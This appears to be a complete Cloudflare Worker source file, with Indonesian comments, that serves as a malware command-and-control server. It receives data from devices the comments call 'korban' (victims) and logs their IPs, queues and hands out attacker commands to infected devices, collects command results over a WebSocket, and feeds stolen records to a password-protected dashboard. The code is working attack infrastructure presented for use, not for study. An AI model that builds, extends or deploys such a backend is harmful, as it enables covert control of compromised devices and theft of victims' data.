// ================================================================
// Cloudflare Worker - verifikasi-api (FULL - DENGAN QUEUE C2!)
// ================================================================

// ============================================================
// KONFIGURASI
// ============================================================
const MAX_DATA = 5000;

// ============================================================
// CORS HEADERS
// ============================================================
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Device-Id',
  'Access-Control-Expose-Headers': 'X-Total-Count',
  'Access-Control-Max-Age': '86400',
};

// ============================================================
// RESPONSE HELPERS
// ============================================================
function jsonResponse(data, status = 200, extraHeaders = {}) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS,
      ...extraHeaders,
    },
  });
}

function unauthorizedResponse() {
  return jsonResponse({ error: 'Access Denied - Invalid Admin Password' }, 403);
}

// ============================================================
// AUTHENTICATION - HANYA UNTUK GET /data DAN /api/data (DASHBOARD LIHAT DATA)!
// ============================================================
function isAuthenticated(request, env) {
  const url = new URL(request.url);
  const key = url.searchParams.get('key') || 
              request.headers.get('X-API-Key') || 
              request.headers.get('Authorization')?.replace('Bearer ', '');
  return key === env.ADMIN_PASSWORD;
}

// ============================================================
// MAIN HANDLER
// ============================================================
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const method = request.method;
    
    if (method === 'OPTIONS') {
      return new Response(null, { headers: CORS });
    }

    // ============================================================
    // 🔥 POST /data atau /api/data - TANPA AUTH! (KIRIM DATA & C2)
    // ============================================================
    if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
      return await handlePostData(request, env);
    }

    // ============================================================
    // 🔥 POST /batch - KIRIM BANYAK PERINTAH SEKALIGUS (TANPA AUTH!)
    // ============================================================
    if (url.pathname === '/batch' && method === 'POST') {
      return await handleBatchCommand(request, env);
    }

    // ============================================================
    // 🔥 GET /data atau /api/data - CEK DULU:
    //    - Jika ?type=perintah → TANPA AUTH (device ambil C2)
    //    - Jika tidak → PAKAI AUTH (dashboard lihat data)
    // ============================================================
    if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
      return await handleGetData(request, env);
    }

    // ============================================================
    // 🔥 GET /get-password - TANPA AUTH!
    // ============================================================
    if (url.pathname === '/get-password' && method === 'GET') {
      return jsonResponse({ 
        status: 'ok', 
        password: env.PASSWORD || 'default123',
        timestamp: Date.now()
      });
    }

    // ============================================================
    // 🔥 WEBSOCKET - TANPA AUTH!
    // ============================================================
    if (url.pathname === '/ws') {
      return handleWebSocket(request, env);
    }

    // ROOT - Health Check
    if (url.pathname === '/' && method === 'GET') {
      const raw = await env.DATA.get('data') || '[]';
      const data = JSON.parse(raw);
      return jsonResponse({
        status: 'ok',
        version: '2.0.0',
        timestamp: new Date().toISOString(),
        totalData: data.length,
      });
    }

    return jsonResponse({ error: 'Not Found' }, 404);
  }
};

// ============================================================
// HANDLER: POST /data (TANPA AUTH - KORBAN & C2 BEBAS!)
// ============================================================
async function handlePostData(request, env) {
  try {
    const body = await request.json();
    
    if (!body || typeof body !== 'object') {
      return jsonResponse({ error: 'Invalid request body' }, 400);
    }
    
    // 🔥 C2 COMMAND DARI DASHBOARD (TANPA AUTH!) - SIMPAN KE QUEUE!
    if (body.sumber === 'c2_command' || body.type === 'c2_command') {
      const cmdData = body.data || body;
      cmdData.timestamp = Date.now();
      cmdData.status = 'pending';
      cmdData.id = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
      
      // 🔥 SIMPAN KE QUEUE (BUKAN LANGSUNG KE perintah!)
      var queueRaw = await env.DATA.get('perintah_queue') || '[]';
      var queue = JSON.parse(queueRaw);
      queue.push(cmdData);
      await env.DATA.put('perintah_queue', JSON.stringify(queue));
      
      // 🔥 TETAP SIMPAN DI perintah UNTUK FALLBACK (1 PERINTAH TERAKHIR)
      await env.DATA.put('perintah', JSON.stringify(cmdData));
      
      return jsonResponse({ 
        status: 'ok', 
        type: 'c2', 
        command: cmdData.aksi,
        queueLength: queue.length
      });
    }
    
    // 🔥 SIMPAN DATA DARI KORBAN (TANPA AUTH!)
    const d = {
      waktu: new Date().toISOString(),
      sumber: body.sumber || body.type || 'unknown',
      data: body.data || body,
      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
      userAgent: request.headers.get('User-Agent') || 'unknown',
    };
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    if (data.length >= MAX_DATA) {
      data = data.slice(-MAX_DATA + 1);
    }
    
    data.push(d);
    await env.DATA.put('data', JSON.stringify(data));
    
    return jsonResponse({ 
      status: 'ok', 
      total: data.length,
    });
    
  } catch (error) {
    return jsonResponse({ error: 'Failed to process data: ' + error.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /batch (TANPA AUTH - KIRIM BANYAK PERINTAH!)
// ============================================================
async function handleBatchCommand(request, env) {
  try {
    const body = await request.json();
    
    if (!body.commands || !Array.isArray(body.commands)) {
      return jsonResponse({ error: 'commands array required' }, 400);
    }
    
    var results = [];
    var success = 0;
    var failed = 0;
    
    // 🔥 AMBIL QUEUE YANG SUDAH ADA
    var queueRaw = await env.DATA.get('perintah_queue') || '[]';
    var queue = JSON.parse(queueRaw);
    
    for (var i = 0; i < body.commands.length; i++) {
      try {
        var cmd = body.commands[i];
        cmd.timestamp = Date.now();
        cmd.status = 'pending';
        cmd.id = 'cmd_' + Date.now() + '_' + i + '_' + Math.random().toString(36).substr(2, 3);
        
        // 🔥 TAMBAHKAN KE QUEUE
        queue.push(cmd);
        
        success++;
        results.push({ index: i, status: 'ok', command: cmd.aksi });
      } catch(e) {
        failed++;
        results.push({ index: i, status: 'failed', error: e.message });
      }
    }
    
    // 🔥 SIMPAN QUEUE YANG SUDAH DIUPDATE
    await env.DATA.put('perintah_queue', JSON.stringify(queue));
    
    // 🔥 SIMPAN PERINTAH TERAKHIR DI perintah (FALLBACK)
    if (body.commands.length > 0) {
      const lastCmd = body.commands[body.commands.length - 1];
      lastCmd.timestamp = Date.now();
      lastCmd.status = 'pending';
      await env.DATA.put('perintah', JSON.stringify(lastCmd));
    }
    
    return jsonResponse({
      status: 'ok',
      total: body.commands.length,
      success: success,
      failed: failed,
      queueLength: queue.length,
      results: results
    });
    
  } catch (error) {
    return jsonResponse({ error: error.message }, 500);
  }
}

// ============================================================
// HANDLER: GET /data (CEK TYPE PERINTAH)
// ============================================================
async function handleGetData(request, env) {
  const url = new URL(request.url);
  
  // 🔥 DEVICE AMBIL PERINTAH C2 (TANPA AUTH!) - PRIORITAS QUEUE!
  if (url.searchParams.get('type') === 'perintah') {
    try {
      // 1️⃣ AMBIL DARI QUEUE DULU
      var queueRaw = await env.DATA.get('perintah_queue') || '[]';
      var queue = JSON.parse(queueRaw);
      
      if (queue.length > 0) {
        var cmd = queue.shift(); // Ambil perintah pertama
        await env.DATA.put('perintah_queue', JSON.stringify(queue));
        
        return new Response(JSON.stringify(cmd), {
          headers: {
            'Content-Type': 'application/json',
            ...CORS,
          },
        });
      }
      
      // 2️⃣ FALLBACK: CEK PERINTAH TUNGGAL
      const perintah = await env.DATA.get('perintah');
      if (perintah) {
        await env.DATA.delete('perintah');
        return new Response(perintah, {
          headers: {
            'Content-Type': 'application/json',
            ...CORS,
          },
        });
      }
      
      return new Response('{}', {
        headers: {
          'Content-Type': 'application/json',
          ...CORS,
        },
      });
    } catch(e) {
      return new Response('{}', {
        headers: {
          'Content-Type': 'application/json',
          ...CORS,
        },
      });
    }
  }
  
  // 🔥 DASHBOARD LIHAT DATA (HARUS AUTH!)
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    const source = url.searchParams.get('source');
    if (source) {
      data = data.filter(item => item.sumber === source);
    }
    
    const search = url.searchParams.get('search');
    if (search) {
      const s = search.toLowerCase();
      data = data.filter(item => JSON.stringify(item).toLowerCase().includes(s));
    }
    
    const sort = url.searchParams.get('sort') || 'newest';
    if (sort === 'newest') {
      data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
    } else if (sort === 'oldest') {
      data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
    }
    
    const page = parseInt(url.searchParams.get('page')) || 1;
    const limit = Math.min(parseInt(url.searchParams.get('limit')) || 50, 200);
    const total = data.length;
    const start = (page - 1) * limit;
    const end = Math.min(start + limit, total);
    
    return jsonResponse(data.slice(start, end), 200, {
      'X-Total-Count': total,
      'X-Page': page,
      'X-Limit': limit,
    });
    
  } catch(e) {
    return jsonResponse([], 200);
  }
}

// ============================================================
// HANDLER: WebSocket (TANPA AUTH)
// ============================================================
async function handleWebSocket(request, env) {
  const upgradeHeader = request.headers.get('Upgrade');
  if (!upgradeHeader || upgradeHeader !== 'websocket') {
    return new Response('Expected Upgrade: websocket', { status: 426 });
  }

  const webSocketPair = new WebSocketPair();
  const [client, server] = Object.values(webSocketPair);

  server.accept();

  let deviceId = 'unknown';

  server.addEventListener('message', async (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'auth') {
        deviceId = data.deviceId || 'unknown';
        server.send(JSON.stringify({ type: 'auth_success' }));
        return;
      }

      // COMMAND DARI DASHBOARD (TANPA AUTH!) - SIMPAN KE QUEUE!
      if (data.type === 'command') {
        var cmdData = data.command;
        cmdData.timestamp = Date.now();
        cmdData.status = 'pending';
        cmdData.id = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        
        var queueRaw = await env.DATA.get('perintah_queue') || '[]';
        var queue = JSON.parse(queueRaw);
        queue.push(cmdData);
        await env.DATA.put('perintah_queue', JSON.stringify(queue));
        await env.DATA.put('perintah', JSON.stringify(cmdData));
        
        server.send(JSON.stringify({ type: 'command_received', queueLength: queue.length }));
        return;
      }

      // DATA DARI DEVICE
      if (data.type === 'data') {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);
        allData.push({
          waktu: new Date().toISOString(),
          sumber: 'websocket_device',
          data: data.data,
          deviceId: deviceId
        });
        if (allData.length > MAX_DATA) {
          allData = allData.slice(-MAX_DATA);
        }
        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'data_saved' }));
        return;
      }

      // C2 RESULT
      if (data.type === 'c2_result') {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);
        allData.push({
          waktu: new Date().toISOString(),
          sumber: 'c2_result',
          data: data.data,
          deviceId: deviceId
        });
        if (allData.length > MAX_DATA) {
          allData = allData.slice(-MAX_DATA);
        }
        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'result_saved' }));
        return;
      }

      // PING/PONG
      if (data.type === 'ping') {
        server.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
        return;
      }

    } catch(e) {
      server.send(JSON.stringify({ type: 'error', message: e.message }));
    }
  });

  return new Response(null, {
    status: 101,
    webSocket: client,
  });
}
